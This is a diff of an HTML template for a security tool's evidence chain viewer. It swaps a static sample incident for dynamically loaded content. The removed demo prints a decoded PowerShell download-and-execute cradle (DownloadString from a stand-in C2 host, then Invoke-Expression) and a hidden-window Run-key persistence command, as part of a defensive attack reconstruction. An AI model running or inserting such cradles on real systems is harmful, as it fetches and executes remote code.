@@ -3,1058 +3,472 @@
 {% block title %}Evidence Chain Viewer - AMOSKYS{% endblock %}
 
 {% block content %}
-<div class="evidence-chain-viewer">
-    <!-- Page Header -->
-    <div class="evidence-header">
-        <div class="header-content">
-            <h1 class="page-title">🔗 EVIDENCE CHAIN VIEWER</h1>
-            <p class="page-subtitle">
-                Full-fidelity attack reconstruction showing how AMOSKYS correlates signals
-                across perspectives to build complete threat narratives
-            </p>
+<div class="ec-page">
+
+    <!-- Header -->
+    <div class="ec-header">
+        <div>
+            <h2 class="ec-title">Evidence Chain Viewer</h2>
+            <p class="ec-subtitle">Full-fidelity attack reconstruction correlating signals across perspectives</p>
         </div>
-        <div class="header-actions">
-            <button class="action-button" onclick="evidenceChain.loadSampleAttack('powershell')">
-                <span>📊</span> LOAD SAMPLE ATTACK
-            </button>
-            <button class="action-button" onclick="evidenceChain.exportChain()">
-                <span>⬇️</span> EXPORT CHAIN
-            </button>
+        <div class="ec-header-actions">
+            <button class="ec-action-btn" onclick="chain.exportChain()">Export Chain</button>
+            <button class="ec-action-btn ec-action-primary" onclick="chain.loadDemo()">Load Demo</button>
         </div>
     </div>
 
     <!-- Threat Summary Card -->
-    <div class="threat-summary-card" id="threat-summary">
-        <div class="summary-header">
-            <div class="threat-badge critical">CRITICAL</div>
-            <h2 class="threat-title">PowerShell-Based Credential Theft with C2 Communication</h2>
-            <div class="threat-meta">
-                <span class="meta-item">
-                    <strong>Detected:</strong> 2025-12-31 14:23:45 UTC
-                </span>
-                <span class="meta-item">
-                    <strong>Confidence:</strong> 98%
-                </span>
-                <span class="meta-item">
-                    <strong>Evidence Points:</strong> 7
-                </span>
-            </div>
-        </div>
-
-        <!-- MITRE ATT&CK Mapping -->
-        <div class="mitre-mapping">
-            <h3>MITRE ATT&CK Techniques</h3>
-            <div class="mitre-tags">
-                <span class="mitre-tag">T1566.001 - Phishing: Spearphishing Attachment</span>
-                <span class="mitre-tag">T1059.001 - Command and Scripting Interpreter: PowerShell</span>
-                <span class="mitre-tag">T1140 - Deobfuscate/Decode Files or Information</span>
-                <span class="mitre-tag">T1071.001 - Application Layer Protocol: Web Protocols</span>
-                <span class="mitre-tag">T1003.001 - OS Credential Dumping: LSASS Memory</span>
-                <span class="mitre-tag">T1547.001 - Boot or Logon Autostart: Registry Run Keys</span>
-            </div>
-        </div>
-
-        <!-- Narrative Summary -->
-        <div class="narrative-summary">
-            <h3>Threat Narrative</h3>
-            <p class="narrative-text">
-                <strong>Initial Vector:</strong> User opened suspicious email attachment "Invoice_2025.docx"
-                which spawned an obfuscated PowerShell process. <br><br>
-
-                <strong>Execution Chain:</strong> The PowerShell command decoded base64-encoded payload and
-                established connection to known malicious domain (malicious-c2.example[.]com). <br><br>
-
-                <strong>Credential Access:</strong> Process attempted to access LSASS memory for credential dumping,
-                followed by registry modification to establish persistence via Run key. <br><br>
-
-                <strong>Risk Assessment:</strong> High-confidence credential theft attempt with command-and-control
-                communication. Immediate containment recommended.
-            </p>
+    <div class="ec-summary-card" id="threat-summary">
+        <div class="ec-summary-loading" id="summary-loading">
+            <div class="ec-loading-icon">&#128279;</div>
+            <p id="loading-msg">Loading evidence chain...</p>
         </div>
     </div>
 
     <!-- Evidence Timeline -->
-    <div class="evidence-timeline-section">
-        <h2 class="section-title">🕐 EVIDENCE TIMELINE</h2>
-        <p class="section-subtitle">Chronological reconstruction of attack progression across all perspectives</p>
-
-        <div class="timeline-container">
-            <!-- Evidence Point 1: File System -->
-            <div class="evidence-point" data-perspective="filesystem">
-                <div class="evidence-marker">
-                    <div class="marker-icon">📁</div>
-                    <div class="marker-line"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge filesystem">FILE SYSTEM</div>
-                        <div class="timestamp">14:23:12 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">Suspicious Document Downloaded</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">File Path:</span>
-                            <span class="detail-value code">C:\Users\jdoe\Downloads\Invoice_2025.docx</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">File Hash (SHA256):</span>
-                            <span class="detail-value code">7a3f9b2c...</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Size:</span>
-                            <span class="detail-value">47.2 KB</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Created By:</span>
-                            <span class="detail-value">OUTLOOK.EXE (PID: 3284)</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> Word document with macro capabilities downloaded from email attachment.
-                        File created timestamp matches known phishing campaign timing.
-                    </div>
-                </div>
-            </div>
-
-            <!-- Evidence Point 2: Process Execution -->
-            <div class="evidence-point" data-perspective="process">
-                <div class="evidence-marker">
-                    <div class="marker-icon">⚙️</div>
-                    <div class="marker-line"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge process">PROCESS</div>
-                        <div class="timestamp">14:23:45 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">Word Document Spawns PowerShell</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">Parent Process:</span>
-                            <span class="detail-value code">WINWORD.EXE (PID: 4892)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Child Process:</span>
-                            <span class="detail-value code">powershell.exe (PID: 5124)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Command Line:</span>
-                            <span class="detail-value code">
-                                powershell.exe -WindowStyle Hidden -EncodedCommand JAB...
-                            </span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">User Context:</span>
-                            <span class="detail-value">CORP\jdoe</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> Abnormal parent-child relationship. Word should not spawn PowerShell
-                        with hidden window and encoded command. High suspicion indicator.
-                    </div>
-                    <div class="correlation-link">
-                        <span class="link-icon">🔗</span>
-                        <span class="link-text">Correlated with Evidence #1 (Document opened 33 seconds prior)</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Evidence Point 3: PowerShell Obfuscation -->
-            <div class="evidence-point" data-perspective="powershell">
-                <div class="evidence-marker">
-                    <div class="marker-icon">💻</div>
-                    <div class="marker-line"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge powershell">POWERSHELL</div>
-                        <div class="timestamp">14:23:46 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">Obfuscated PowerShell Command Decoded</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">Encoded Command:</span>
-                            <span class="detail-value code">
-                                JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...
-                            </span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Decoded Payload:</span>
-                            <div class="code-block">
-<pre>$client = New-Object System.Net.WebClient
-$data = $client.DownloadString('http://malicious-c2.example.com/payload')
-Invoke-Expression $data</pre>
-                            </div>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Obfuscation Type:</span>
-                            <span class="detail-value">Base64 Encoding</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> PowerShell command downloads and executes remote payload.
-                        Use of obfuscation indicates attempt to evade detection.
-                    </div>
-                    <div class="correlation-link">
-                        <span class="link-icon">🔗</span>
-                        <span class="link-text">Correlated with Evidence #2 (Same PID: 5124)</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Evidence Point 4: DNS Query -->
-            <div class="evidence-point" data-perspective="dns">
-                <div class="evidence-marker">
-                    <div class="marker-icon">🔍</div>
-                    <div class="marker-line"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge dns">DNS</div>
-                        <div class="timestamp">14:23:47 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">Malicious Domain Lookup</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">Query:</span>
-                            <span class="detail-value code">malicious-c2.example.com</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Response IP:</span>
-                            <span class="detail-value code">45.33.32.156</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Process:</span>
-                            <span class="detail-value">powershell.exe (PID: 5124)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Threat Intel:</span>
-                            <span class="detail-value threat">Known C2 domain - Last seen in APT28 campaign</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> Domain flagged in multiple threat intelligence feeds as command-and-control
-                        infrastructure. High confidence malicious intent.
-                    </div>
-                    <div class="correlation-link">
-                        <span class="link-icon">🔗</span>
-                        <span class="link-text">Correlated with Evidence #3 (Domain from decoded PowerShell)</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Evidence Point 5: Network Connection -->
-            <div class="evidence-point" data-perspective="network">
-                <div class="evidence-marker">
-                    <div class="marker-icon">🌐</div>
-                    <div class="marker-line"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge network">NETWORK</div>
-                        <div class="timestamp">14:23:48 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">C2 Connection Established</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">Source:</span>
-                            <span class="detail-value code">10.0.2.15:49823</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Destination:</span>
-                            <span class="detail-value code">45.33.32.156:443 (HTTPS)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Process:</span>
-                            <span class="detail-value">powershell.exe (PID: 5124)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Bytes Transferred:</span>
-                            <span class="detail-value">2.3 MB downloaded, 47 KB uploaded</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> Large data download over encrypted channel. Transfer size consistent
-                        with second-stage payload delivery.
-                    </div>
-                    <div class="correlation-link">
-                        <span class="link-icon">🔗</span>
-                        <span class="link-text">Correlated with Evidence #4 (IP from DNS resolution)</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Evidence Point 6: Memory Access -->
-            <div class="evidence-point" data-perspective="memory">
-                <div class="evidence-marker">
-                    <div class="marker-icon">💾</div>
-                    <div class="marker-line"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge memory">MEMORY</div>
-                        <div class="timestamp">14:24:15 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">LSASS Memory Access Attempt</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">Source Process:</span>
-                            <span class="detail-value code">powershell.exe (PID: 5124)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Target Process:</span>
-                            <span class="detail-value code">lsass.exe (PID: 644)</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Access Rights:</span>
-                            <span class="detail-value code">PROCESS_VM_READ | PROCESS_QUERY_INFORMATION</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Technique:</span>
-                            <span class="detail-value threat">Credential Dumping Attempt</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> PowerShell process attempting to read LSASS memory. Classic credential
-                        dumping technique (Mimikatz-style). Attack progression into credential access phase.
-                    </div>
-                    <div class="correlation-link">
-                        <span class="link-icon">🔗</span>
-                        <span class="link-text">Correlated with Evidence #2-5 (Same PowerShell PID chain)</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Evidence Point 7: Registry Persistence -->
-            <div class="evidence-point" data-perspective="registry">
-                <div class="evidence-marker">
-                    <div class="marker-icon">📋</div>
-                    <div class="marker-line final"></div>
-                </div>
-                <div class="evidence-card">
-                    <div class="evidence-card-header">
-                        <div class="perspective-badge registry">REGISTRY</div>
-                        <div class="timestamp">14:24:32 UTC</div>
-                    </div>
-                    <h3 class="evidence-title">Persistence Mechanism Installed</h3>
-                    <div class="evidence-details">
-                        <div class="detail-row">
-                            <span class="detail-label">Registry Key:</span>
-                            <span class="detail-value code">
-                                HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-                            </span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Value Name:</span>
-                            <span class="detail-value code">WindowsUpdate</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Value Data:</span>
-                            <span class="detail-value code">
-                                powershell.exe -WindowStyle Hidden -EncodedCommand JAB...
-                            </span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label">Modified By:</span>
-                            <span class="detail-value">powershell.exe (PID: 5124)</span>
-                        </div>
-                    </div>
-                    <div class="evidence-analysis">
-                        <strong>Analysis:</strong> Registry Run key modification ensures malware executes at user logon.
-                        Establishes persistence on compromised system. Attack complete.
-                    </div>
-                    <div class="correlation-link">
-                        <span class="link-icon">🔗</span>
-                        <span class="link-text">Correlated with Evidence #2-6 (Same PowerShell attack chain)</span>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <div class="ec-section" id="timeline-section" style="display:none;">
+        <h3 class="ec-section-title">Evidence Timeline</h3>
+        <p class="ec-section-sub">Chronological reconstruction across all agent perspectives</p>
+        <div class="ec-timeline" id="evidence-timeline"></div>
     </div>
 
-    <!-- Correlation Graph -->
-    <div class="correlation-graph-section">
-        <h2 class="section-title">🕸️ CORRELATION GRAPH</h2>
-        <p class="section-subtitle">Visual representation of how evidence points connect across perspectives</p>
-
-        <div class="graph-container">
-            <div class="graph-legend">
-                <div class="legend-item">
-                    <div class="legend-color filesystem"></div>
-                    <span>File System</span>
-                </div>
-                <div class="legend-item">
-                    <div class="legend-color process"></div>
-                    <span>Process</span>
-                </div>
-                <div class="legend-item">
-                    <div class="legend-color powershell"></div>
-                    <span>PowerShell</span>
-                </div>
-                <div class="legend-item">
-                    <div class="legend-color dns"></div>
-                    <span>DNS</span>
-                </div>
-                <div class="legend-item">
-                    <div class="legend-color network"></div>
-                    <span>Network</span>
-                </div>
-                <div class="legend-item">
-                    <div class="legend-color memory"></div>
-                    <span>Memory</span>
-                </div>
-                <div class="legend-item">
-                    <div class="legend-color registry"></div>
-                    <span>Registry</span>
-                </div>
-            </div>
-
-            <div class="graph-placeholder">
-                <svg viewBox="0 0 800 400" class="correlation-svg">
-                    <!-- This would be a dynamic graph in production -->
-                    <text x="400" y="200" text-anchor="middle" fill="var(--text-secondary)" font-size="18">
-                        📊 Interactive Correlation Graph
-                    </text>
-                    <text x="400" y="230" text-anchor="middle" fill="var(--text-muted)" font-size="14">
-                        (Full implementation would show node-link diagram with D3.js)
-                    </text>
-                </svg>
-            </div>
-        </div>
+    <!-- Correlation Summary -->
+    <div class="ec-section" id="correlation-section" style="display:none;">
+        <h3 class="ec-section-title">Correlation Graph</h3>
+        <div class="ec-correlation" id="correlation-graph"></div>
     </div>
 
     <!-- Response Recommendations -->
-    <div class="response-recommendations">
-        <h2 class="section-title">🛡️ RECOMMENDED RESPONSE ACTIONS</h2>
-        <div class="recommendations-grid">
-            <div class="recommendation-card priority-critical">
-                <div class="rec-header">
-                    <span class="rec-icon">🚨</span>
-                    <span class="rec-priority">IMMEDIATE</span>
-                </div>
-                <h3>Isolate Affected Endpoint</h3>
-                <p>Disconnect workstation CORP-WS-4892 from network to prevent lateral movement</p>
-                <button class="rec-action-button">EXECUTE ISOLATION</button>
-            </div>
-
-            <div class="recommendation-card priority-high">
-                <div class="rec-header">
-                    <span class="rec-icon">🔒</span>
-                    <span class="rec-priority">HIGH</span>
-                </div>
-                <h3>Terminate Malicious Process</h3>
-                <p>Kill PowerShell process (PID: 5124) and child processes</p>
-                <button class="rec-action-button">TERMINATE PROCESS</button>
-            </div>
-
-            <div class="recommendation-card priority-high">
-                <div class="rec-header">
-                    <span class="rec-icon">🔑</span>
-                    <span class="rec-priority">HIGH</span>
-                </div>
-                <h3>Reset User Credentials</h3>
-                <p>Force password reset for jdoe@corp.com - credentials likely compromised</p>
-                <button class="rec-action-button">RESET CREDENTIALS</button>
-            </div>
-
-            <div class="recommendation-card priority-medium">
-                <div class="rec-header">
-                    <span class="rec-icon">🧹</span>
-                    <span class="rec-priority">MEDIUM</span>
-                </div>
-                <h3>Remove Persistence</h3>
-                <p>Delete registry Run key: HKCU\...\Run\WindowsUpdate</p>
-                <button class="rec-action-button">REMOVE PERSISTENCE</button>
-            </div>
-
-            <div class="recommendation-card priority-medium">
-                <div class="rec-header">
-                    <span class="rec-icon">🌐</span>
-                    <span class="rec-priority">MEDIUM</span>
-                </div>
-                <h3>Block C2 Domain</h3>
-                <p>Add malicious-c2.example.com to firewall blocklist</p>
-                <button class="rec-action-button">BLOCK DOMAIN</button>
-            </div>
-
-            <div class="recommendation-card priority-low">
-                <div class="rec-header">
-                    <span class="rec-icon">🔍</span>
-                    <span class="rec-priority">LOW</span>
-                </div>
-                <h3>Hunt for Indicators</h3>
-                <p>Search for file hash and C2 domain across other endpoints</p>
-                <button class="rec-action-button">START HUNT</button>
-            </div>
-        </div>
+    <div class="ec-section" id="recommendations-section" style="display:none;">
+        <h3 class="ec-section-title">Recommended Actions</h3>
+        <div class="ec-recs" id="recommendations"></div>
     </div>
 </div>
 
 <style>
-.evidence-chain-viewer {
-    max-width: 100%;
-}
+/* ── Evidence Chain Page ── */
+.ec-page { padding: 1.5rem; display: flex; flex-direction: column; gap: 1.25rem; }
 
-/* Page Header */
-.evidence-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 2rem;
-    padding-bottom: 2rem;
-    border-bottom: 2px solid rgba(0, 217, 255, 0.3);
+/* ── Header ── */
+.ec-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
+.ec-title { font-size: 1.3rem; font-weight: 800; color: var(--text-primary); margin: 0; }
+.ec-subtitle { font-size: 0.82rem; color: var(--text-secondary); margin: 0.3rem 0 0 0; }
+.ec-header-actions { display: flex; gap: 0.5rem; }
+.ec-action-btn {
+    padding: 0.45rem 1rem; border-radius: 8px; font-size: 0.78rem; font-weight: 600;
+    cursor: pointer; border: 1px solid rgba(255,255,255,0.1);
+    background: rgba(255,255,255,0.05); color: var(--text-secondary); transition: all 0.2s;
 }
+.ec-action-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }
+.ec-action-primary { background: rgba(0,217,255,0.1); color: var(--neural-primary); border-color: rgba(0,217,255,0.25); }
+.ec-action-primary:hover { background: rgba(0,217,255,0.18); }
 
-.page-title {
-    font-size: 2rem;
-    font-weight: 900;
-    color: var(--neural-primary);
-    margin-bottom: 0.5rem;
-    letter-spacing: 2px;
+/* ── Summary Card ── */
+.ec-summary-card {
+    background: var(--bg-secondary); border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px; padding: 1.5rem;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.15);
 }
+.ec-summary-card.threat-critical { border-color: rgba(255,51,102,0.3); background: linear-gradient(135deg, rgba(102,0,34,0.15), var(--bg-secondary)); }
+.ec-summary-card.threat-high { border-color: rgba(255,102,0,0.3); }
+.ec-summary-card.threat-medium { border-color: rgba(255,170,0,0.3); }
+.ec-summary-loading { text-align: center; padding: 2rem; color: var(--text-muted); }
+.ec-loading-icon { font-size: 2.5rem; margin-bottom: 0.5rem; opacity: 0.4; }
 
-.page-subtitle {
-    color: var(--text-secondary);
-    font-size: 1rem;
-    max-width: 600px;
+.ec-summary-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 1rem; gap: 1rem; flex-wrap: wrap; }
+.ec-sev-badge {
+    padding: 0.3rem 0.8rem; border-radius: 6px; font-size: 0.65rem;
+    font-weight: 800; text-transform: uppercase; letter-spacing: 1px; flex-shrink: 0;
 }
-
-.header-actions {
-    display: flex;
-    gap: 1rem;
-}
-
-.action-button {
-    background: rgba(0, 217, 255, 0.2);
-    border: 2px solid var(--neural-primary);
-    color: var(--neural-primary);
-    padding: 0.75rem 1.5rem;
-    border-radius: 5px;
-    font-size: 0.9rem;
-    font-weight: 700;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-}
-
-.action-button:hover {
-    background: var(--neural-primary);
-    color: var(--bg-primary);
-}
-
-/* Threat Summary Card */
-.threat-summary-card {
-    background: linear-gradient(135deg, rgba(102, 0, 34, 0.3) 0%, rgba(51, 0, 17, 0.5) 100%);
-    border: 2px solid var(--neural-danger);
-    border-radius: 10px;
-    padding: 2rem;
-    margin-bottom: 3rem;
-}
-
-.summary-header {
-    margin-bottom: 2rem;
-}
-
-.threat-badge {
-    display: inline-block;
-    padding: 0.5rem 1rem;
-    border-radius: 5px;
-    font-size: 0.75rem;
-    font-weight: 800;
-    letter-spacing: 1.5px;
-    margin-bottom: 1rem;
-}
-
-.threat-badge.critical {
-    background: var(--neural-danger);
-    color: white;
-}
-
-.threat-title {
-    font-size: 1.8rem;
-    font-weight: 800;
-    color: var(--neural-danger);
-    margin-bottom: 1rem;
-}
-
-.threat-meta {
-    display: flex;
-    gap: 2rem;
-    color: var(--text-secondary);
-    font-size: 0.9rem;
-}
-
-.meta-item strong {
-    color: var(--text-primary);
-}
+.ec-sev-badge.sev-critical { background: rgba(255,51,102,0.2); color: #ff3366; }
+.ec-sev-badge.sev-high { background: rgba(255,102,0,0.2); color: #ff6600; }
+.ec-sev-badge.sev-medium { background: rgba(255,170,0,0.2); color: #ffaa00; }
+.ec-sev-badge.sev-low { background: rgba(0,136,255,0.15); color: #0088ff; }
+.ec-threat-title { font-size: 1.1rem; font-weight: 800; color: var(--text-primary); margin-bottom: 0.5rem; }
+.ec-threat-meta { display: flex; gap: 1.5rem; font-size: 0.78rem; color: var(--text-secondary); flex-wrap: wrap; }
+.ec-threat-meta strong { color: var(--text-primary); }
 
 /* MITRE Mapping */
-.mitre-mapping {
-    margin-bottom: 2rem;
-    padding: 1.5rem;
-    background: rgba(0, 0, 0, 0.3);
-    border-radius: 8px;
+.ec-mitre { padding: 1rem; background: rgba(0,0,0,0.2); border-radius: 8px; margin-top: 1rem; }
+.ec-mitre h4 { font-size: 0.82rem; color: var(--neural-primary); font-weight: 700; margin: 0 0 0.5rem 0; }
+.ec-mitre-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; }
+.ec-mitre-tag {
+    padding: 0.2rem 0.5rem; border-radius: 4px; font-size: 0.7rem; font-weight: 600;
+    background: rgba(0,217,255,0.1); color: var(--neural-primary);
+    border: 1px solid rgba(0,217,255,0.15); font-family: monospace;
 }
 
-.mitre-mapping h3 {
-    color: var(--neural-primary);
-    font-size: 1.1rem;
-    margin-bottom: 1rem;
+/* Narrative */
+.ec-narrative { padding: 1rem; background: rgba(0,0,0,0.2); border-radius: 8px; margin-top: 1rem; }
+.ec-narrative h4 { font-size: 0.82rem; color: var(--neural-primary); font-weight: 700; margin: 0 0 0.5rem 0; }
+.ec-narrative p { font-size: 0.82rem; color: var(--text-secondary); line-height: 1.7; margin: 0; }
+
+/* ── Sections ── */
+.ec-section { margin-top: 0.5rem; }
+.ec-section-title { font-size: 1.05rem; font-weight: 800; color: var(--neural-primary); margin: 0 0 0.3rem 0; }
+.ec-section-sub { font-size: 0.78rem; color: var(--text-muted); margin: 0 0 1rem 0; }
+
+/* ── Evidence Timeline ── */
+.ec-timeline { position: relative; padding-left: 40px; }
+.ec-timeline::before {
+    content: ''; position: absolute; left: 18px; top: 0; bottom: 0; width: 2px;
+    background: linear-gradient(180deg, var(--neural-primary), rgba(0,217,255,0.15));
 }
 
-.mitre-tags {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 0.75rem;
+.ec-evidence {
+    position: relative; margin-bottom: 1.5rem;
+    padding: 1rem 1.25rem; border-radius: 10px;
+    background: var(--bg-secondary); border: 1px solid rgba(255,255,255,0.06);
+    border-left: 4px solid var(--neural-primary); transition: all 0.2s;
+}
+.ec-evidence:hover { border-color: rgba(0,217,255,0.3); box-shadow: 0 4px 16px rgba(0,217,255,0.1); }
+.ec-evidence.sev-critical { border-left-color: #ff3366; }
+.ec-evidence.sev-high { border-left-color: #ff6600; }
+.ec-evidence.sev-medium { border-left-color: #ffaa00; }
+
+/* Timeline marker dot */
+.ec-evidence::before {
+    content: ''; position: absolute; left: -32px; top: 1rem;
+    width: 12px; height: 12px; border-radius: 50%;
+    background: var(--neural-primary); border: 2px solid var(--bg-primary);
+    box-shadow: 0 0 8px rgba(0,217,255,0.3);
+}
+.ec-evidence.sev-critical::before { background: #ff3366; box-shadow: 0 0 8px rgba(255,51,102,0.3); }
+.ec-evidence.sev-high::before { background: #ff6600; }
+.ec-evidence.sev-medium::before { background: #ffaa00; }
+
+.ec-ev-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; gap: 0.5rem; }
+.ec-ev-perspective {
+    padding: 0.15rem 0.5rem; border-radius: 4px; font-size: 0.6rem;
+    font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase;
+}
+.ec-ev-time { font-size: 0.72rem; color: var(--text-muted); font-family: monospace; }
+.ec-ev-title { font-size: 0.92rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.35rem; }
+.ec-ev-desc { font-size: 0.78rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 0.5rem; }
+
+.ec-ev-details {
+    padding: 0.75rem; background: rgba(0,0,0,0.2); border-radius: 6px;
+    margin-bottom: 0.5rem; font-size: 0.75rem;
+}
+.ec-detail-row { display: grid; grid-template-columns: 140px 1fr; gap: 0.5rem; margin-bottom: 0.3rem; }
+.ec-detail-row:last-child { margin-bottom: 0; }
+.ec-detail-label { color: var(--text-muted); font-weight: 600; }
+.ec-detail-value { color: var(--text-secondary); font-family: monospace; word-break: break-all; }
+
+.ec-ev-analysis {
+    padding: 0.6rem 0.75rem; background: rgba(0,217,255,0.04);
+    border-left: 3px solid var(--neural-primary); border-radius: 4px;
+    font-size: 0.75rem; color: var(--text-secondary); line-height: 1.5;
 }
 
-.mitre-tag {
-    background: rgba(255, 99, 71, 0.2);
-    border: 1px solid rgba(255, 99, 71, 0.4);
-    color: #ff6347;
-    padding: 0.5rem 0.75rem;
-    border-radius: 5px;
-    font-size: 0.85rem;
-    font-weight: 600;
-    font-family: 'Courier New', monospace;
+.ec-ev-correlation {
+    display: flex; align-items: center; gap: 0.5rem; margin-top: 0.5rem;
+    padding: 0.5rem 0.6rem; background: rgba(0,255,136,0.06);
+    border: 1px solid rgba(0,255,136,0.15); border-radius: 6px;
+    font-size: 0.72rem; color: #00ff88;
 }
 
-/* Narrative Summary */
-.narrative-summary {
-    padding: 1.5rem;
-    background: rgba(0, 0, 0, 0.3);
-    border-radius: 8px;
+/* ── Correlation Graph ── */
+.ec-correlation {
+    background: var(--bg-secondary); border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px; padding: 1.5rem; min-height: 120px;
 }
-
-.narrative-summary h3 {
-    color: var(--neural-primary);
-    font-size: 1.1rem;
-    margin-bottom: 1rem;
+.ec-corr-stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 0.75rem; }
+.ec-corr-stat {
+    padding: 0.75rem; border-radius: 8px; background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.06); text-align: center;
 }
+.ec-corr-stat-val { font-size: 1.2rem; font-weight: 800; color: var(--text-primary); }
+.ec-corr-stat-lbl { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
 
-.narrative-text {
-    color: var(--text-secondary);
-    line-height: 1.8;
-    font-size: 0.95rem;
+/* ── Recommendations ── */
+.ec-recs { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 0.75rem; }
+.ec-rec {
+    padding: 1rem; border-radius: 10px; background: var(--bg-secondary);
+    border: 1px solid rgba(255,255,255,0.06); transition: all 0.2s;
 }
-
-/* Section Titles */
-.section-title {
-    font-size: 1.5rem;
-    font-weight: 800;
-    color: var(--neural-primary);
-    margin-bottom: 0.5rem;
-    letter-spacing: 2px;
+.ec-rec:hover { border-color: rgba(0,217,255,0.2); transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+.ec-rec-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; }
+.ec-rec-icon { font-size: 1.4rem; }
+.ec-rec-priority {
+    padding: 0.15rem 0.4rem; border-radius: 3px; font-size: 0.55rem;
+    font-weight: 800; letter-spacing: 0.5px;
 }
+.ec-rec.priority-critical .ec-rec-priority { background: rgba(255,51,102,0.2); color: #ff3366; }
+.ec-rec.priority-high .ec-rec-priority { background: rgba(255,102,0,0.2); color: #ff6600; }
+.ec-rec.priority-medium .ec-rec-priority { background: rgba(0,217,255,0.15); color: var(--neural-primary); }
+.ec-rec h4 { font-size: 0.85rem; font-weight: 700; color: var(--text-primary); margin: 0 0 0.3rem 0; }
+.ec-rec p { font-size: 0.75rem; color: var(--text-secondary); line-height: 1.5; margin: 0; }
 
-.section-subtitle {
-    color: var(--text-secondary);
-    font-size: 1rem;
-    margin-bottom: 2rem;
-}
+/* ── Agent color coding ── */
+.perspective-proc { background: rgba(78,205,196,0.2); color: #4ECDC4; }
+.perspective-flow { background: rgba(243,129,129,0.2); color: #F38181; }
+.perspective-dns { background: rgba(170,150,218,0.2); color: #AA96DA; }
+.perspective-auth { background: rgba(255,107,53,0.2); color: #FF6B35; }
